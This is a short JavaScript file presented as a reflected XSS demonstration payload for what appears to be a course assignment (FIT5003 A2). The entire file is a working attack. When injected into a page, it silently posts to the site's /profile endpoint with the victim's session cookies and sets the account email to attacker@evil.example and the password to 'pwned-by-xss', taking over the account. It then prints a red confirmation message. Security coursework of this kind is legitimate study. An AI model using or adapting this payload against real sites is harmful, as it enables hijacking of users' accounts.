// payload.js — FIT5003 A2 reflected XSS demo payload
(function () {
  const body = "email=attacker@evil.example&password=pwned-by-xss";
  fetch("/profile", {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: body
  }).then(() => {
    document.body.innerHTML += "<p style='color:red'>[XSS payload executed]</p>";
  });
})();
